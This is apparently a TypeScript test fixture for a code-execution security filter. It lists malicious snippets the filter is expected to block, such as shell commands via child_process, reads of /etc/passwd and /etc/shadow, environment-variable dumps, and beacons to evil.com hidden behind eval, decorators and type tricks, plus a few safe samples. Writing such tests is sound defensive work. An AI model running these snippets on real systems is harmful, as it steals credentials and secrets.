/**
 * TypeScript Security Attack Vectors
 * 
 * TypeScript compiles to JavaScript, so it inherits all JS vulnerabilities.
 * These tests verify that malicious code is blocked regardless of TypeScript syntax.
 * 
 * Each test includes:
 * - name: Test identifier
 * - code: The malicious code attempt
 * - expectBlocked: Whether this should be blocked (true) or allowed (false)
 * - category: Attack category for grouping
 * - explanation: Human-readable description of how hackers use this attack
 */

export const typescriptTests = [
  // ════════════════════════════════════════════════════════════════
  // COMMAND EXECUTION ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'TS: Type-annotated child_process',
    code: `import { exec, ExecException } from 'child_process';
const callback = (err: ExecException | null, stdout: string) => console.log(stdout);
exec('whoami', callback);`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 ATTACK: TypeScript Typed Imports of Dangerous Modules
      
      How hackers use this:
      TypeScript's type annotations don't change runtime behavior.
      Adding types to dangerous imports doesn't make them safe.
      
      Real-world impact:
      - Same as JavaScript child_process attacks
      - Type safety doesn't provide security
      - Compiled JS will execute just like untyped code
      
      Key insight:
      TypeScript is a SUPERSET of JavaScript - if it's dangerous in JS,
      it's equally dangerous in TS. Types are stripped at compile time.
    `,
  },
  {
    name: 'TS: Generic exec wrapper',
    code: `import { exec } from 'child_process';
function execute<T>(cmd: string): Promise<T> {
  return new Promise((resolve) => exec(cmd, (_, out) => resolve(out as T)));
}
execute<string>('id');`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 ATTACK: Generic Wrapper Around Dangerous Functions
      
      How hackers use this:
      Wrapping dangerous functions in TypeScript generics and promises
      obfuscates the malicious intent while preserving functionality.
      
      Real-world impact:
      - Type-safe interface to command execution
      - Makes malicious code look like legitimate utilities
      - Generic typing can confuse code reviewers
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // FILE SYSTEM ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'TS: Typed fs operations',
    code: `import { readFileSync, PathLike } from 'fs';
const readConfig = (path: PathLike): string => readFileSync(path, 'utf8');
console.log(readConfig('/etc/passwd'));`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: Type-Safe File Operations
      
      How hackers use this:
      TypeScript's PathLike type makes file access look legitimate,
      but the underlying operation is still dangerous.
      
      Real-world impact:
      - Read sensitive system files with proper typing
      - Code appears more "professional" and reviewable
      - Same security implications as raw fs access
    `,
  },
  {
    name: 'TS: fs with proper types',
    code: `import * as fs from 'fs';
interface FileContent { data: string; }
const content: FileContent = { data: fs.readFileSync('/etc/shadow', 'utf8') };`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: Structured File Content Extraction
      
      How hackers use this:
      Wrapping stolen file content in typed interfaces makes the code
      look like legitimate data processing.
      
      Real-world impact:
      - /etc/shadow contains password hashes
      - Structured exfiltration payload
      - Types don't validate or sanitize content
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // NETWORK ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'TS: Typed HTTP request',
    code: `import * as https from 'https';
interface Response { statusCode?: number; }
https.get('https://evil.com/beacon', (res: Response) => console.log(res.statusCode));`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 ATTACK: Type-Annotated Network Requests
      
      How hackers use this:
      Adding TypeScript interfaces to network requests doesn't change
      their ability to exfiltrate data or beacon to C2 servers.
      
      Real-world impact:
      - Phone home to attacker infrastructure
      - Exfiltrate data with typed payloads
      - Proper typing makes malware more maintainable
    `,
  },
  {
    name: 'TS: Async fetch with types',
    code: `interface ApiResponse { status: string; }
const beacon = async (): Promise<ApiResponse> => {
  const res = await fetch('https://evil.com/collect');
  return res.json();
};`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 ATTACK: Modern Async Network Communication
      
      How hackers use this:
      async/await with typed responses makes malicious network code
      look like legitimate API integration.
      
      Real-world impact:
      - Clean async exfiltration code
      - Type-safe C2 communication
      - Easier to maintain attack infrastructure
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // SYSTEM ACCESS ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'TS: Process env with interface',
    code: `interface EnvVars { [key: string]: string | undefined; }
const env: EnvVars = process.env;
console.log(JSON.stringify(env));`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 ATTACK: Typed Environment Variable Access
      
      How hackers use this:
      Creating typed interfaces for process.env allows extracting
      all environment variables in a structured format.
      
      Real-world impact:
      - Steal all environment variables at once
      - JSON.stringify for easy exfiltration
      - AWS keys, database passwords, API tokens
    `,
  },
  {
    name: 'TS: OS info with types',
    code: `import * as os from 'os';
interface SystemInfo { hostname: string; user: string; }
const info: SystemInfo = { hostname: os.hostname(), user: os.userInfo().username };`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 ATTACK: Structured System Information Gathering
      
      How hackers use this:
      Collecting system information in typed objects creates a clean
      fingerprint of the target system.
      
      Real-world impact:
      - System reconnaissance for targeted attacks
      - Identify high-value targets
      - Build system profiles for exploitation
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // TYPE SYSTEM ABUSE ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'TS: Type assertion bypass',
    code: `const dangerous = 'child_process' as const;
const exec = require(dangerous as string);`,
    expectBlocked: true,
    category: 'type_abuse',
    explanation: `
      🎯 ATTACK: Type Assertion for Filter Evasion
      
      How hackers use this:
      TypeScript type assertions (as const, as string) are compile-time only.
      They can make code look different while producing identical runtime behavior.
      
      Real-world impact:
      - Bypass AST-based analyzers that don't understand TS
      - Make static analysis harder
      - Runtime behavior unchanged
    `,
  },
  {
    name: 'TS: Any type bypass',
    code: `const getModule = (name: any) => require(name);
getModule('child_process').exec('id');`,
    expectBlocked: true,
    category: 'type_abuse',
    explanation: `
      🎯 ATTACK: Using 'any' to Hide Dangerous Operations
      
      How hackers use this:
      The 'any' type disables TypeScript's type checking, allowing
      any value to pass through without compile-time errors.
      
      Real-world impact:
      - Bypass TypeScript's safety guarantees
      - Dynamic module loading without type errors
      - Makes code harder to analyze statically
    `,
  },
  {
    name: 'TS: Generic type escape',
    code: `function loadModule<T>(name: string): T { return require(name) as T; }
const cp = loadModule<{ exec: Function }>('child_process');
cp.exec('whoami');`,
    expectBlocked: true,
    category: 'type_abuse',
    explanation: `
      🎯 ATTACK: Generic Functions for Module Loading
      
      How hackers use this:
      Generics allow writing functions that can return any type,
      making dangerous module access look like type-safe utilities.
      
      Real-world impact:
      - Type-safe wrapper around require()
      - Reusable attack code
      - Harder to identify malicious intent
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // DECORATOR ABUSE ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'TS: Class with malicious decorator',
    code: `function malicious(target: any) { require('child_process').exec('id'); }
@malicious
class Victim {}`,
    expectBlocked: true,
    category: 'decorator_abuse',
    explanation: `
      🎯 ATTACK: Decorator-based Code Execution
      
      How hackers use this:
      TypeScript decorators execute at class definition time.
      A malicious decorator runs code just by decorating a class.
      
      Real-world impact:
      - Execute code when module loads
      - Hide execution in decorator functions
      - Common in legitimate frameworks (easier to hide malware)
    `,
  },
  {
    name: 'TS: Method decorator attack',
    code: `function evil(target: any, key: string, desc: PropertyDescriptor) {
  require('fs').readFileSync('/etc/passwd');
}
class A { @evil method() {} }`,
    expectBlocked: true,
    category: 'decorator_abuse',
    explanation: `
      🎯 ATTACK: Method Decorator for File Access
      
      How hackers use this:
      Method decorators execute when the class is defined, not when
      the method is called. This allows early code execution.
      
      Real-world impact:
      - Execute before main code runs
      - Read files at import/definition time
      - Decorator pattern is common, less suspicious
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // INTERFACE/TYPE DEFINITION ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'TS: Dynamic property access',
    code: `const global: { [key: string]: any } = globalThis;
const p = global['pro' + 'cess'];
console.log(p.env);`,
    expectBlocked: true,
    category: 'type_abuse',
    explanation: `
      🎯 ATTACK: Index Signature for Dynamic Access
      
      How hackers use this:
      TypeScript index signatures allow any string as a property key.
      Combined with string concatenation, this bypasses static analysis.
      
      Real-world impact:
      - Access blocked properties dynamically
      - Index signature defeats type-based security
      - Runtime behavior identical to JavaScript
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // EVAL AND CODE INJECTION
  // ════════════════════════════════════════════════════════════════
  {
    name: 'TS: Typed eval wrapper',
    code: `function safeEval<T>(code: string): T { return eval(code) as T; }
safeEval<void>("require('child_process').exec('id')");`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 ATTACK: Type-Safe Eval Wrapper
      
      How hackers use this:
      Wrapping eval in a typed function doesn't make it safe.
      The type assertion is stripped at compile time.
      
      Real-world impact:
      - "safeEval" name is deceptive
      - Type assertions don't validate or sanitize
      - Same security issues as raw eval
    `,
  },
  {
    name: 'TS: Function constructor with types',
    code: `type ExecFn = () => void;
const fn: ExecFn = new Function("require('fs').readFileSync('/etc/passwd')") as ExecFn;
fn();`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 ATTACK: Typed Function Constructor
      
      How hackers use this:
      The Function constructor creates functions from strings (like eval).
      Adding types doesn't change this dangerous behavior.
      
      Real-world impact:
      - Dynamic code execution with type safety theater
      - Often missed by TypeScript-aware analyzers
      - Type assertion masks the danger
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // PROTOTYPE POLLUTION IN TYPESCRIPT
  // ════════════════════════════════════════════════════════════════
  {
    name: 'TS: Object prototype pollution',
    code: `interface Polluted { polluted?: string; }
(Object.prototype as Polluted).polluted = 'pwned';
const obj: Polluted = {};
console.log(obj.polluted);`,
    expectBlocked: true,
    category: 'prototype_pollution',
    explanation: `
      🎯 ATTACK: Typed Prototype Pollution
      
      How hackers use this:
      TypeScript allows modifying Object.prototype through type assertions.
      The pollution affects all objects at runtime.
      
      Real-world impact:
      - Same as JavaScript prototype pollution
      - Interface makes the pollution look intentional
      - Type system doesn't prevent prototype modification
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // NAMESPACE/MODULE ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'TS: Namespace with malicious code',
    code: `namespace Malware {
  export const run = () => require('child_process').exec('id');
}
Malware.run();`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 ATTACK: Namespace-Encapsulated Malware
      
      How hackers use this:
      TypeScript namespaces organize code but don't provide isolation.
      Malicious code inside a namespace runs normally.
      
      Real-world impact:
      - Organize malware in namespaces
      - Look like legitimate utility libraries
      - Namespace doesn't sandbox code
    `,
  },
  {
    name: 'TS: Module augmentation attack',
    code: `declare module 'child_process' { export function exec(cmd: string): void; }
import { exec } from 'child_process';
exec('id');`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 ATTACK: Module Declaration with Usage
      
      How hackers use this:
      Module augmentation looks like type declarations but includes
      actual imports and usage of dangerous modules.
      
      Real-world impact:
      - Declare and use dangerous modules together
      - Looks like type definition file
      - Real import and execution occurs
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // SAFE CODE
  // ════════════════════════════════════════════════════════════════
  {
    name: 'TS: Safe typed function',
    code: `const add = (a: number, b: number): number => a + b; console.log(add(2, 3));`,
    expectBlocked: false,
    // Note: expectedOutput removed - TypeScript requires transpilation which is separate from security
    category: 'safe_code',
    explanation: `
      ✅ SAFE: Typed Mathematical Function
      
      This is legitimate code that should NOT be blocked:
      Type-annotated functions performing safe operations
      are exactly what TypeScript is designed for.
      
      Note: Actual execution requires TypeScript transpilation,
      which is a runtime concern separate from security filtering.
    `,
  },
  {
    name: 'TS: Safe interface usage',
    code: `interface Point { x: number; y: number; }
const p: Point = { x: 10, y: 20 };
console.log(p.x + p.y);`,
    expectBlocked: false,
    category: 'safe_code',
    explanation: `
      ✅ SAFE: Interface-Based Data Structures
      
      This is legitimate code that should NOT be blocked:
      Defining and using interfaces for type safety is
      core TypeScript functionality.
    `,
  },
  {
    name: 'TS: Safe generic function',
    code: `function identity<T>(value: T): T { return value; }
console.log(identity('hello'));`,
    expectBlocked: false,
    category: 'safe_code',
    explanation: `
      ✅ SAFE: Generic Identity Function
      
      This is legitimate code that should NOT be blocked:
      Generics without dangerous operations are safe
      and fundamental to TypeScript development.
    `,
  },
  {
    name: 'TS: Safe class with methods',
    code: `class Calculator {
  add(a: number, b: number): number { return a + b; }
}
const calc = new Calculator();
console.log(calc.add(5, 3));`,
    expectBlocked: false,
    category: 'safe_code',
    explanation: `
      ✅ SAFE: Class with Typed Methods
      
      This is legitimate code that should NOT be blocked:
      Object-oriented TypeScript with proper typing
      is standard practice for application development.
    `,
  },
  {
    name: 'TS: Safe enum usage',
    code: `enum Color { Red, Green, Blue }
console.log(Color.Green);`,
    expectBlocked: false,
    category: 'safe_code',
    explanation: `
      ✅ SAFE: Enum Definition and Usage
      
      This is legitimate code that should NOT be blocked:
      Enums are a TypeScript feature for defining
      named constants. Completely safe.
    `,
  },
];
